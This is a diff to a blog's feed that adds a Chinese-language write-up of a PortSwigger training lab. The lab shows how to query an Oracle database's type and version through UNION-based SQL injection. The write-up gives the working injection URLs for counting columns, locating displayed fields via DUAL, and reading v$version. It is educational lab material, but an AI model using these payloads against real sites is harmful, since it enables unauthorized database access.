@@ -24,6 +24,37 @@
 &lt;/ol>
 &lt;/li>
 &lt;li>使用方法1，解题的url为&lt;code>filter?category=Accessories'+UNION+(select+null,+null,+null)--&lt;/code>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection attack, querying the database type and version on Oracle</title><link>/posts/sql-injection-lab-querying-database-version-oracle/</link><pubDate>Sun, 24 Nov 2024 12:37:06 +0800</pubDate><guid>/posts/sql-injection-lab-querying-database-version-oracle/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>SQL query为&lt;code>SELECT * FROM table WHERE category = &amp;lt;category&amp;gt;&lt;/code>&lt;/li>
+&lt;li>此题需要通过UNION 注入攻击获取Oracle数据库的类型和版本&lt;/li>
+&lt;li>UNION 注入攻击需要以下三步
+&lt;ol>
+&lt;li>判断列数
+&lt;ol>
+&lt;li>使用&lt;code>order by n&lt;/code>语句不断累加n，n累加到3时报错，所以判断SQL query的返回列数为2&lt;/li>
+&lt;li>url为&lt;code>filter?category=Accessories'+order+by+2--&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>判断显示位
+&lt;ol>
+&lt;li>根据题目Hit，Oracle数据库中的&lt;code>SELECT&lt;/code>语句必须指定&lt;code>FROM&lt;/code>，可以使用Oracle内置的DUAL表来达成目的&lt;/li>
+&lt;li>url为&lt;code>filter?category=Accessories'+union+select+'a1',+'a2'+from+dual+--&lt;/code>
+&lt;img alt="Determine the display position" src="/img/sql-injection-lab-querying-database-version-oracle-2.jpg">&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>进行注入
+&lt;ol>
+&lt;li>根据&lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>，Oracle数据库的类型和版本获取方式为&lt;code>SELECT banner FROM v$version&lt;/code>&lt;/li>
+&lt;li>url为&lt;code>filter?category=Accessories'+union+select+banner,+null+from+v$version+--&lt;/code>
+&lt;img alt="Perform the injection" src="/img/sql-injection-lab-querying-database-version-oracle-3.jpg">&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ol>
+&lt;/li>
 &lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection vulnerability allowing login bypass</title><link>/posts/sql-injection-lab-login-bypass/</link><pubDate>Sat, 23 Nov 2024 22:46:24 +0800</pubDate><guid>/posts/sql-injection-lab-login-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-login-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-login-bypass-1.jpg">&lt;/p>
